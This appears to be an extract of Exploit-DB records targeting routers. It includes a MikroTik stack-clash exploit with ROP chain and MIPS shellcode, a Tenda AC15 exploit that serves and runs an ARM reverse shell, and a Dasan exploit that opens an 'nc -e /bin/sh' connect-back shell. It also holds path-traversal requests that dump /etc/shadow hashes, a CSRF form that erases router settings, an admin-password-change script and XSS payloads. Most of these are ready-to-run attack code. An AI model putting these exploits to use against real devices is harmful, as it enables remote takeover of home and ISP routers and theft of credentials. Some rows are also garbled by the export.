# XX XX XX XX  <-- here the shell code will write 0x00000000 (used as end of argv_array and as envp_array)    [shellcode_start_address  -4]             <--- envp_array
# The shell code execution starts here!
# if v0 != 0 [res of fork()]
# if v0 == 0 [res of fork()]
# 1) Stack finder gadget (to make stack pivot)
#                                            Action: addiu  $a0, $sp, 0x600 + var_5E8                      # a0 = stackpointer + 0x18
#                                            Control Jump:  jr    0x600 + var_4($sp)
# This gadget (moreover) allows us to reserve 1512 bytes inside the rop chain
# to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
# 2) Copy a0 in v0 because of next gadget
#                                           Gadget Action:   move $v0, $a0                                 # v0 = a0
#                                           Gadget Control:  jr  0x28 + var_4($sp)
# 3) Jump to the stack (start shell code)
#                                           Gadget Action:   jalr $t9                                      # jump v0
#                                           Gadget Control:  jalr  $v0
# 1) Start 2 threads
# open 2 socket so 2 threads are created
# 2) Stack Clash
# 2.1) send post header with Content-Length bigger than AST_STACKSIZE to socket 1 (thread A)
# 2.2) send some bytes as post data to socket 1 (thread A)
# 2.3) send post header with Content-Length to reserve ROP space to socket 2 (thread B)
# 3) Send ROP chain and shell code
# 4) Start ROP chain","import socket, time, sys, struct, re
from ropper import RopperService
AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
ROS_STACKSIZE =  0x20000 # newer version of ROS have a different stack size per thread (128 KB)
SKIP_SPACE    =   0x1000 # 4 KB of ""safe"" space for the stack of thread 2
ROP_SPACE     =   0x8000 # we can send 32 KB of ROP chain!
ALIGN_SIZE    = 0x10 # alloca align memory with ""content-length + 0x10 & 0xF"" so we need to take it into account
ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
class MyRopper():
def __init__(self, filename):
self.rs = RopperService()
self.rs.clearCache()
self.rs.addFile(filename)
self.rs.loadGadgetsFor()
self.rs.options.inst_count = 10
self.rs.loadGadgetsFor()
self.rs.loadGadgetsFor() # sometimes Ropper doesn't update new gadgets
def get_gadgets(self, regex):
gadgets = []
for _, g in self.rs.search(search=regex):
gadgets.append(g)
if len(gadgets) > 0:
return gadgets
else:
raise Exception(""Cannot find gadgets!"")
def contains_string(self, string):
s = self.rs.searchString(string)
t = [a for a in s.values()][0]
return len(t) > 0
def get_arch(self):
return self.rs.files[0].arch._name
@staticmethod
def get_ra_offset(gadget):
Return the offset of next Retun Address on the stack
So you know how many bytes to put before next gadget address
Eg:
lw $ra, 0xAB ($sp)   --> return: 0xAB
for line in gadget.lines:
offset_len = re.findall(""lw \$ra, (0x[0-9a-f]+)\(\$sp\)"", line[1])
if offset_len:
return int(offset_len[0], 16)
raise Exception(""Cannot find $ra offset in this gadget!"")
def makeHeader(num):
return b""POST /jsproxy HTTP/1.1\r\nContent-Length: "" + bytes(str(num), 'ascii') + b""\r\n\r\n""
def makeSocket(ip, port):
s = socket.socket()
try:
s.connect((ip, port))
except:
print(""Error connecting to socket"")
sys.exit(-1)
print(""Connected"")
time.sleep(0.5)
return s
def socketSend(s, data):
try:
s.send(data)
except:
print(""Error sending data"")
sys.exit(-1)
print(""Sent"")
time.sleep(0.5)
def build_shellcode(shellCmd):
shell_code = b''
shellCmd = bytes(shellCmd, ""ascii"")
shell_code += struct.pack('>L', 0x24500000)    # addiu s0, v0, 0           # s0 = v0                                                Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly])
shell_code += struct.pack('>L', 0x24020fa2)    # addiu v0, zero, 0xfa2     # v0 = 4002 (fork)                                       Put the syscall number of fork (4002) in v0
shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start fork()
shell_code += struct.pack('>L', 0x10400003)    # beqz v0, 0x10             # jump 12 byte forward if v0 == 0                        Jump to execve part of the shellcode if PID is 0
shell_code += struct.pack('>L', 0x24020001)    # addiu v0, zero, 1         # a0 = 1                                                 Put exit parameter in a0
shell_code += struct.pack('>L', 0x24020fa1)    # addiu v0, zero, 0xfa1     # v0 = 4001 (exit)                                       Put the syscall number of exit (4002) in v0
shell_code += struct.pack('>L', 0x0000000c)   # syscall                   # launch syscall                                         Start exit(1)
shell_code += struct.pack('>L', 0x26040050)    # addiu a0, s0, 0x50        # a0 = shellcode_start_address + 0x50                    Calculate the address of string ""/bin/bash"" and put it in a0 (the first parameter of execve)
shell_code += struct.pack('>L', 0xae04fff0)    # sw a0, -16(s0)            # shellcode_start_address[-16] = bin_bash_address        Write in the first entry of the ""argv"" array the address of the string ""/bin/bash""
shell_code += struct.pack('>L', 0x26110060)    # addiu s1, s0, 0x60        # s1 = shellcode_start_address + 0x60                    Calculate the address of string ""-c"" and put it in s1
shell_code += struct.pack('>L', 0xae11fff4)    # sw s1, -12(s0)            # shellcode_start_address[-12] = c_address               Write in the second entry of the ""argv"" array the address of the string ""-c""
shell_code += struct.pack('>L', 0x26110070)    # addiu s1, s0, 0x70        # s1 = shellcode_start_address + 0x70                    Calculate the address of string ""shellCmd"" and put it in s1
shell_code += struct.pack('>L', 0xae11fff8)    # sw s1, -8(s0)             # shellcode_start_address[-8]  = shellCmd_address        Write in the third entry of the ""argv"" array the address of the string ""shellCmd""
shell_code += struct.pack('>L', 0xae00fffc)    # sw zero, -4(s0)           # shellcode_start_address[-4]  = 0x00                    Write NULL address as end of argv_array and envp_array
shell_code += struct.pack('>L', 0x2205fff0)    # addi a1, s0, -16          # a1 = shellcode_start_address - 16                      Put the address of argv_array in a1 (the second parameter of execve)
shell_code += struct.pack('>L', 0x2206fffc)    # addi a2, s0, -4           # a2 = shellcode_start_address - 4                       Put the address of envp_array in a2 (the third parameter of execve)
shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011 (execve)                                     Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve(""/bin/bash"", [""/bin/bash"", ""-c"", ""shellCmd"", NULL], [NULL])
shell_code += b'P' * (0x50 - len(shell_code))   # offset to simplify string address calculation
shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- bin_bash_address
shell_code += b'P' * (0x60 - len(shell_code))   # offset to simplify string address calculation
shell_code += b'-c\x00'                                  # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x60]                 <--- c_address
shell_code += b'P' * (0x70 - len(shell_code))   # offset to simplify string address calculation
shell_code += shellCmd + b'\x00'                         #                                                    [shellcode_start + 0x70]                 <--- shellCmd_address
return shell_code
def build_payload(binRop, shellCmd):
print(""Building shellcode + ROP chain..."")
ropChain = b''
shell_code = build_shellcode(shellCmd)
stack_finder = binRop.get_gadgets(""addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;"")[0]
0x0040ae04:                     (ROS 6.38.4)
addiu $a0, $sp, 0x18   <--- needed action
lw $ra, 0x5fc($sp)     <--- jump control   [0x5fc, a lot of space for the shellcode!]
lw $s3, 0x5f8($sp)
lw $s2, 0x5f4($sp)
lw $s1, 0x5f0($sp)
lw $s0, 0x5ec($sp)
move $v0, $zero
jr $ra
ropChain += struct.pack('>L', stack_finder.address)
ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
ropChain += shell_code   # write the shell code in this ""big"" offset
next_gadget_offset = MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)
if next_gadget_offset < 0: # check if shell command fits inside this big offset
raise Exception(""Shell command too long! Max len: "" + str(next_gadget_offset + len(shellCmd)) + "" bytes"")
ropChain += b'C' * next_gadget_offset # offset because of this: 0x600 + var_4($sp)
mov_v0_a0 = binRop.get_gadgets(""lw ?ra, %move ?v0, ?a0;% jr ?ra;"")[0]
0x00414E58:                    (ROS 6.38.4)
lw $ra, 0x24($sp);    <--- jump control
lw $s2, 0x20($sp);
lw $s1, 0x1c($sp);
lw $s0, 0x18($sp);
move $v0, $a0;        <--- needed action
jr $ra;
ropChain += struct.pack('>L', mov_v0_a0.address)
ropChain += b'D' * MyRopper.get_ra_offset(mov_v0_a0) # offset because of this: 0x28 + var_4($sp)
jump_v0 = binRop.get_gadgets(""move ?t9, ?v0; jalr ?t9;"")[0]
0x00412540:                   (ROS 6.38.4)
move $t9, $v0;       <--- jump control
jalr $t9;            <--- needed action
ropChain += struct.pack('>L', jump_v0.address)
return ropChain
def stackClash(ip, port, payload):
print(""Opening 2 sockets"")
s1 = makeSocket(ip, port) # socket 1, thread A
s2 = makeSocket(ip, port) # socket 2, thread B
print(""Stack clash..."")
socketSend(s1, makeHeader(AST_STACKSIZE + SKIP_SPACE + ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)
socketSend(s1, b'A'*(SKIP_SPACE - ALIGN_SIZE - ADDRESS_SIZE)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved
socketSend(s2, makeHeader(ROP_SPACE)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned
print(""Sending payload"")
socketSend(s1, payload)
print(""Starting exploit"")
s2.close() # close socket 2 to return from the function of thread B and start ROP chain
print(""Done!"")
def crash(ip, port):
print(""Crash..."")
s = makeSocket(ip, port)
socketSend(s, makeHeader(-1))
socketSend(s, b'A' * 0x1000)
s.close()
time.sleep(2.5) # www takes up to 3 seconds to restart
if __name__ == ""__main__"":
if len(sys.argv) == 5:
ip       = sys.argv[1]
port     = int(sys.argv[2])
binary   = sys.argv[3]
shellCmd = sys.argv[4]
binRop = MyRopper(binary)
if binRop.get_arch() != 'MIPSBE':
raise Exception(""Wrong architecture! You have to pass a mipsbe executable"")
if binRop.contains_string(""pthread_attr_setstacksize""):
AST_STACKSIZE = ROS_STACKSIZE
payload = build_payload(binRop, shellCmd)
crash(ip, port) # should make stack clash more reliable
stackClash(ip, port, payload)
else:
print(""Usage: "" + sys.argv[0] + "" IP PORT binary shellcommand"")"
2018-02-14,Remote,Hardware,Tim Carrington,Tenda AC15 Router,Remote Code Execution,"#!/usr/bin/env python
# EDB Note ~ Source: https://www.fidusinfosec.com/remote-code-execution-cve-2018-5767/
#We got a connection, lets make the exploit thread aware
#Loop continuosly, simple reverse shell interface.
#Guess the same libc base continuosly
#: pop {r3, r4, r7, pc}
#: mov r0, sp ; blx r3
#build the request, with the malicious password field
#The request will throw an exception when we crash the server,
#we don't care about this, so don't handle it.
#Give the device some time to restart the
#Give the thread a little time to start up, and fail if that happens","import urllib2
import struct
import time
import socket
from optparse import *
import SimpleHTTPServer
import SocketServer
import threading
import sys
import os
import subprocess
ARM_REV_SHELL = (
""#include <sys/socket.h>\n""
""#include <sys/types.h>\n""
""#include <string.h>\n""
""#include <stdio.h>\n""
""#include <netinet/in.h>\n""
""int main(int argc, char **argv)\n""
""{\n""
""           struct sockaddr_in addr;\n""
""           socklen_t addrlen;\n""
""           int sock = socket(AF_INET, SOCK_STREAM, 0);\n""
""           memset(&addr, 0x00, sizeof(addr));\n""
""           addr.sin_family = AF_INET;\n""
""           addr.sin_port = htons(%d);\n""
""           addr.sin_addr.s_addr = inet_addr(\""%s\"");\n""
""           int conn = connect(sock, (struct sockaddr *)&addr,sizeof(addr));\n""
""           dup2(sock, 0);\n""
""           dup2(sock, 1);\n""
""           dup2(sock, 2);\n""
""           system(\""/bin/sh\"");\n""
""}\n""
REV_PORT = 31337
HTTPD_PORT = 8888
DONE = False
* This function creates a listening socket on port
* REV_PORT. When a connection is accepted it updates
* the global DONE flag to indicate successful exploitation.
* It then jumps into a loop whereby the user can send remote
* commands to the device, interacting with a spawned /bin/sh
* process.
def threaded_listener():
global DONE
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
host = (""0.0.0.0"", REV_PORT)
try:
s.bind(host)
except:
print ""[+] Error binding to %d"" %REV_PORT
return -1
print ""[+] Connect back listener running on port %d"" %REV_PORT
s.listen(1)
conn, host = s.accept()
DONE = True
print ""[+] Got connect back from %s"" %host[0]
print ""[+] Entering command loop, enter exit to quit""
while True:
print ""#"",
cmd = raw_input()
if cmd == ""exit"":
break
if cmd == '':
continue
conn.send(cmd + ""\n"")
print conn.recv(4096)
* Take the ARM_REV_SHELL code and modify it with
* the given ip and port to connect back to.
* This function then compiles the code into an
* ARM binary.
@Param comp_path – This should be the path of the cross-compiler.
@Param my_ip – The IP address of the system running this code.
def compile_shell(comp_path, my_ip):
global ARM_REV_SHELL
outfile = open(""a.c"", ""w"")
ARM_REV_SHELL = ARM_REV_SHELL%(REV_PORT, my_ip)
outfile.write(ARM_REV_SHELL)
outfile.close()
compile_cmd = [comp_path, ""a.c"",""-o"", ""a""]
s = subprocess.Popen(compile_cmd, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
while s.poll() == None:
continue
if s.returncode == 0:
return True
else:
print ""[x] Error compiling code, check compiler? Read the README?""
return False
* This function uses the SimpleHTTPServer module to create
* a http server that will serve our malicious binary.
* This function is called as a thread, as a daemon process.
def start_http_server():
Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
httpd = SocketServer.TCPServer(("""", HTTPD_PORT), Handler)
print ""[+] Http server started on port %d"" %HTTPD_PORT
httpd.serve_forever()
* This function presents the actual vulnerability exploited.
* The Cookie header has a password field that is vulnerable to
* a sscanf buffer overflow, we make use of 2 ROP gadgets to
* bypass DEP/NX, and can brute force ASLR due to a watchdog
* process restarting any processes that crash.
* This function will continually make malicious requests to the
* devices web interface until the DONE flag is set to True.
@Param host – the ip address of the target.
@Param port – the port the webserver is running on.
@Param my_ip – The ip address of the attacking system.
def exploit(host, port, my_ip):
global DONE
url = ""http://%s:%s/goform/exeCommand""%(host, port)
i = 0
command = ""wget http://%s:%s/a -O /tmp/a && chmod 777 /tmp/a && /tmp/./a &;"" %(my_ip, HTTPD_PORT)
libc_base = ****
curr_libc = libc_base + (0x7c << 12)
system = struct.pack(""<I"", curr_libc + ****)
pop = struct.pack(""<I"", curr_libc + ****)
mv_r0_sp = struct.pack(""<I"", curr_libc + ****)
password = ""A""*offset
password += pop + system + ""B""*8 + mv_r0_sp + command + "".gif""
print ""[+] Beginning brute force.""
while not DONE:
i += 1
print ""[+] Attempt %d"" %i
req = urllib2.Request(url)
req.add_header(""Cookie"", ""password=%s""%password)
try:
resp = urllib2.urlopen(req)
except:
pass
time.sleep(1)
print ""[+] Exploit done""
def main():
parser = OptionParser()
parser.add_option(""-t"", ""–target"", dest=""host_ip"", help=""IP address of the target"")
parser.add_option(""-p"", ""–port"", dest=""host_port"", help=""Port of the targets webserver"")
parser.add_option(""-c"", ""–comp-path"", dest=""compiler_path"", help=""path to arm cross compiler"")
parser.add_option(""-m"", ""–my-ip"", dest=""my_ip"", help=""your ip address"")
options, args = parser.parse_args()
host_ip = options.host_ip
host_port = options.host_port
comp_path = options.compiler_path
my_ip = options.my_ip
if host_ip == None or host_port == None:
parser.error(""[x] A target ip address (-t) and port (-p) are required"")
if comp_path == None:
parser.error(""[x] No compiler path specified, you need a uclibc arm cross compiler, such as https://www.uclibc.org/downloads/binaries/0.9.30/cross-compiler-arm4l.tar.bz2"")
if my_ip == None:
parser.error(""[x] Please pass your ip address (-m)"")
if not compile_shell(comp_path, my_ip):
print ""[x] Exiting due to error in compiling shell""
return -1
httpd_thread = threading.Thread(target=start_http_server)
httpd_thread.daemon = True
httpd_thread.start()
conn_listener = threading.Thread(target=threaded_listener)
conn_listener.start()
time.sleep(3)
if not conn_listener.is_alive():
print ""[x] Exiting due to conn_listener error""
return -1
exploit(host_ip, host_port, my_ip)
conn_listener.join()
return 0
if __name__ == '__main__':
main()"
2018-02-28,WebApps,Perl,Lorenzo Di Fuccia,Routers2 2.24,Cross-Site Scripting,"# Exploit Title: Routers2 2.24 - Reflected Cross-Site Scripting
# Date: 18-01-18
# Vendor Homepage: http://www.steveshipway.org/software/
# Software Link: https://github.com/sshipway/routers2
# Version: 2.24
# CVE: CVE-2018-6193
# Platform: Perl
# Category: webapps
# Exploit Author: Lorenzo Di Fuccia
# Contact: lorenzo.difuccia@gmail.com
# Website: https://github.com/lorenzodifuccia
http://router.com/cgi-bin/routers2.pl?rtr=--><script>alert(""XSS"")</script>&bars=Cami&xgtype=d&page=graph&xgstyle=l2&xmtype=routers
https://github.com/sshipway/routers2/issues/1","1. Description
Routers2 is vulnerable to Reflected Cross-Site Scripting, affecting the 'rtr' GET parameter in a page=graph action to `cgi-bin/routers2.pl`.
2. Proof of Concept
3. Solution
Update the program cloning the repo from GitHub or disable the 'paranoia' setting in the web section of the `routers2.conf`.
4. References"
2017-12-06,WebApps,Hardware,SecuriTeam,Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146,Remote Code Execution,"## Vulnerability Summary
## Credit
## Vendor response
## Vulnerability details
## Proof of Concept
#sock.settimeout(10)
#clientsocket = sock
# rop1
#rop2
# execute command","The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146
Dasan Networks GPON ONT WiFi Router “is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It’s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.”
An independent security researcher, TigerPuma (at) Fosec.vn, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
We tried to contact Dasan since October 8 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.
All cgi in Dasan web service are symbolic link of cgipage.cgi, and when client request, lighttpd will invoke the corresponding path.
The buffer overflow vulnerability found in function login_action which handler login request.
The function uses strcpy without check length of input from client request.
If we will look at the stack, we can see that we can trigger the buffer overflow and in the end to control the pc.
import sys
import socket
import json
import time
import struct
import ssl
if len(sys.argv) != 4:
print ""Use: {} ip port connectback"".format(sys.argv[0])
sys.exit(1)
host = str(sys.argv[1])
port = int(sys.argv[2])
connectback = str(sys.argv[3])
buf = 1024
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket = ssl.wrap_socket(sock)
clientsocket.connect((host, port))
addr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW
rop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0
addr_rop1 = struct.pack("">i"",rop1)
system = addr_libc + 0x0003CC9C     #system
addr_system =  struct.pack("">i"",system)
command = ""nc "" + connectback + "" -e /bin/sh;""
payload = ""A""*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command
data = ""action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"".format(payload)
http_payload = """"""POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}"""""".format(len(data),data)
print http_payload
clientsocket.send(http_payload)
respond_raw = clientsocket.recv(buf).strip()
print respond_raw
respond_raw = clientsocket.recv(buf).strip()
print respond_raw
respond_raw = clientsocket.recv(buf).strip()
print respond_raw
clientsocket.close()"
2017-07-16,WebApps,Hardware,SecuriTeam,Geneko Routers,Path Traversal,"## Vulnerability Summary
## Credit
## Vendor response
## Vulnerability Details
## Router response:
## Proof of Concept","The following advisory describes a Unauthenticated Path Traversal vulnerability found in Geneko GWR routers series.
Geneko GWG is compact and cost effective communications solution that provides cellular capabilities for fixed and mobile applications such as data acquisition, smart metering, remote monitoring and management. GWG supports a variety of radio bands options on 2G, 3G and 4G cellular technologies.
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
We have informed Geneko of the vulnerability on the 28th of May 2017, the last email we received from them was on the 7th of June 2017. We have no further updates from Geneko regarding the availability of a patch or a workaround for the vulnerability.
CVE: CVE-2017-11456
User controlled input is not sufficiently sanitized, and then passed to a function responsible for accessing the filesystem. Successful exploitation of this vulnerability enables a remote unauthenticated user to read the content of any file existing on the host, this includes files located outside of the web root folder.
By sending the following GET request, You get direct access to the configuration file, which allows you to log in to the login panel:
GET /../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Connection: close
Upgrade-Insecure-Requests: 1
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 121
{""enable"":true,""username"":""admin"",""password”:""xxx!"",""web_access"":0,""http_port"":80,""https_port"":443,""gui_timeout"":15}
In this case, the admin user is configured to have access to the shell (SSH Access) as can be seen in the /etc/passwd
admin:x:0:0:root:/root:/root/cli
path_traversal.py
import requests
import sys
domain = sys.argv[1]
r = requests.get(""http://""+domain+""/../../../../../etc/shadow"")
print r.content
The router then will response with:
root:$1$ryjw5yTs$xoQlzavABZ5c7gQuD7jKO0:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
admin:$1$72G6z9YF$cs5dS2elxOD3qicUTlEHO/:10933:0:99999:7:::"
2017-05-10,WebApps,Hardware,SecuriTeam,Cisco DPC3928 Router,Arbitrary File Disclosure,"## Vulnerability Summary
## Credit
## Vendor response
## Vulnerability details
## Proof of Concept","The following advisory describes an arbitrary file disclosure vulnerability found in Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway.
The Cisco DPC3928AD DOCSIS is a home wireless router that is currently ""Out of support"" but is provided by ISPs world wide.
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.
We reported the vulnerability to Cisco and they informed us that the Cisco DPC3928AD sold to Technicolor: “The Cisco DPC3928AD was actually sold to Technicolor a while back. In this case, we will ask you to please contact Technicolor at security@technicolor.com to open a case with them”
After connecting Technicolor, they informed us that the product has reached end of life and they will not patch the vulnerability: “After an extensive search for the product to perform validation, we were unable to source the gateway to validate your proof of concept. Due to the end-of-sale and end-of-life of the product Technicolor will not be patching the bug.”
CVE: CVE-2017-11502
Cisco DPC3928AD DOCSIS 3.0 2-PORT Voice Gateway vulnerability is present on its TCP/4321 port .
An attacker can get the /etc/passwd file from the remote device, by sending the following request:
GET /../../../../../../../../../../../../../../../../etc/passwd
HTTP/1.1
Host: 192.168.0.10:4321
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
The Router response the next output with the passwd content:
HTTP/1.1 200 OK
Content-Type: text/html
SERVER: Linux/#2 Wed Nov 12 10:23:46 CST 2014 UPnP/1.0 Broadcom
UPNP/0.9
Content-Length: 247
Accept-Ranges: bytes
Date: Thu, 10 Nov 2016 16:01:04 GMT
root:HAdbdMWcXHOuKQ:0:0:root:/:/bin/sh
admin:KASJakljhHqiuJ:0:0:aDMINISTRATOR:/:/bin/false"
2018-02-05,WebApps,Hardware,Sajibe Kanti,Netis WF2419 Router,Cross-Site Scripting,"# Exploit Title: Netis-WF2419 HTML Injection
# Date: 20/01/2018
# Exploit Author: Sajibe Kanti
# Author Contact :https://twitter.com/@sajibekantibd
# Vendor Homepage: http://www.netis-systems.com/
# Version: Netis-WF2419 , V3.2.41381
# Tested on: Windows 10
# CEV : CVE-2018-6190
#Solution:","HTML Injection in Netis-WF2419
Netis-WF2419 is prone to an HTML-injection vulnerability because it fails
to sufficiently sanitize user-supplied data.
Attacker-supplied HTML or script code could run in the context of the
affected site, potentially allowing the attacker to steal cookie-based
authentication credentials and control how the site is rendered to the
user; other attacks are also possible.
Netis-WF2419 is vulnerable;
Proof of Concept:
1. Go to your wireless router ip (ex. 192.168.0.1)
2. Go to Wireless Settings - tab
3. Now Click MAC Filtering -tab
4.Write  MAC Address and in -Description- write (<h1>XSS-PWD</h1>)
5.Click Add
6. Now You Can See HTML Injection
Upgrade Firmware"
2018-01-28,WebApps,Hardware,Sajibe Kanti,Netis WF2419 Router,Cross-Site Request Forgery,"# Exploit Title: Netis-WF2419 Router Cross-Site Request Forgery (CSRF)
# Date: 28/01/2018
# Exploit Author: Sajibe Kanti
# Author Contact: https://twitter.com/@sajibekantibd
# Vendor Homepage: http://www.netis-systems.com/
# Version: Netis-WF2419, V2.2.36123
# Tested on: Windows 10
#Technical Details & Description:
#Manual steps to reproduce the vulnerability :
#PoC: Exploitcode :","A cross-site request forgery web vulnerability has been discovered in the
official Netis-WF2419 Router.
The vulnerability allows remote attackers to manipulate client-side
web-application to browser requests to compromise the router
by execution of system specific functions without session protection.
A remote attacker is able to delete Address Reservation List settings of
Netis Router with a cross-site request forgery html script code.
The vulnerability can be exploited by loading embedded html code in a site
or page. The issue can also be exploited by attackers to external redirect
an user account
to malicious web pages.
The issue requires medium user interaction in case of exploitation. The
request method to execute is GET and the attack vector is located on the
client-side of the router firmware.
Exploitation of the cross site request forgery web vulnerability requires
no privilege web application user account and medium or high user
interaction.
Successful exploitation results in client-side account theft by client-side
phishing, client-side external redirects and non-persistent manipulation of
application functions that are in use.
The vulnerability can be exploited by remote attackers without privileged
application user account and with medium or high user interaction.
For security demonstration or to reproduce the vulnerability follow the
provided information and steps below to continue.
1. Logging Your Netis Router
1. Now inject or use the html code
2. When the user of the router opens the html code in site or other type of
redirection. Router Address Reservation List will be erased!
4. Successful reproduce of the cross site request forgery vulnerability!
<html>
<body>
<form action=""http://192.168.10.2/cgi-bin-igd/netcore_set.cgi""
method=""POST"">
<input type=""hidden"" name=""mode&#95;name"" value=""netcore&#95;set"" />
<input type=""hidden"" name=""reserve&#95;address&#95;set"" value=""1"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>
Note: By loading this html code All Address Reservation List will be erased
and the router becomes finally misconfigured!"
2018-01-25,WebApps,Hardware,Víctor Calvo,ASUS DSL-N14U B1 Router 1.1.2.3_345,Change Administrator Password,#requests.packages.urilib3.disable_warnings(),"import requests
import sys
import urllib3
ip = sys.argv[1]
user = sys.argv[2]
newPassword = sys.argv[3]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
data = {""group_id"": '', ""action_mode"": ""apply"", ""current_page"": ""Main_Password.asp"", ""next_page"": ""index.asp"", ""flag"": '', ""usernamepasswdFIag"": ""1"", ""http_username"": user, ""http_passwd"": newPassword, ""foilautofill"": ''}
headers = {""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0"", ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,'/';q=0.8"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Referer"": ip + ""/Main_Password.asp"", ""Content-Type"": ""application/x-www-form-urIencoded"", ""Connection"": ""close"", ""Upgrade-Insecure-Requests"": ""1""}
print(""-> New password for "" + user + "" is "" + newPassword)
try:
res = requests.post(ip + '/mod__login.asp', headers=headers, data=data, timeout=2, verify=FaIse)
except:
sys.exit(1)"
2017-01-31,WebApps,Hardware,Pedro Ribeiro,Billion / TrueOnline / ZyXEL Routers,Multiple Vulnerabilities,"#1
#2
#3
#4
#5
#6
#7
http://www.agileinfosec.co.uk/",">> Multiple vulnerabilities in TrueOnline / ZyXEL / Billion routers
>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
Disclosure: 26/12/2016 / Last updated: 18/01/2017
>> Summary:
TrueOnline is a major Internet Service Provider in Thailand which distributes various rebranded ZyXEL and Billion routers to its customers.
Three router models - ZyXEL P660HN-T1A v1, ZyXEL P660HN-T1A v2 and Billion 5200W-T - contain a number of default administrative accounts, as well as authenticated and unauthenticated command injection vulnerabilities (running as root) in their web interfaces, mostly in the syslog remote forwarding function. All the routers are still in widespread use in Thailand, with the Billion 5200W-T router currently being distributed to new customers.
These routers are based on the TC3162U SoC (or variants of it), a system-on-a-chip made by TrendChip, which was a manufacturer of SoC that was acquired by Ralink / MediaTek in 2011.
TC3162U based routers have two firmware variants.
The first variant is ""ras"", used on hardware versions that have 4mb or less of flash storage, which is based on the real time operating system ZynOS. It is infamous as the includes Allegro RomPager v4.07, which is vulnerable to the ""misfortune cookie"" attack (see [1]), and its web server is vulnerable to the ""rom-0"" attack (see [2]).
The other variant is ""tclinux"", which is a full fledged Linux used in hardware versions that have more than 4 MB of flash storage. This advisory refers to this variant, which includes the Boa web server and several ASP files with the command injection vulnerabilities. Note that tclinux might also be vulnerable to the misfortune cookie and rom-0 attacks - this was not investigated in detail by the author. For more information on tclinux see [3].
It should be noted that tclinux contains files and configuration settings in other languages (for example in Turkish). Therefore it is likely that these firmware versions are not specific to TrueOnline, and other ISP customised routers in other countries might also be vulnerable. It is also possible that other brands and router models that use the tclinux variant are also affected by the command injection vulnerabilities (while the default accounts are likely to be TrueOnline specific). Please contact pedrib@gmail.com if you find any other routers or firmware versions that have the same vulnerabilities.
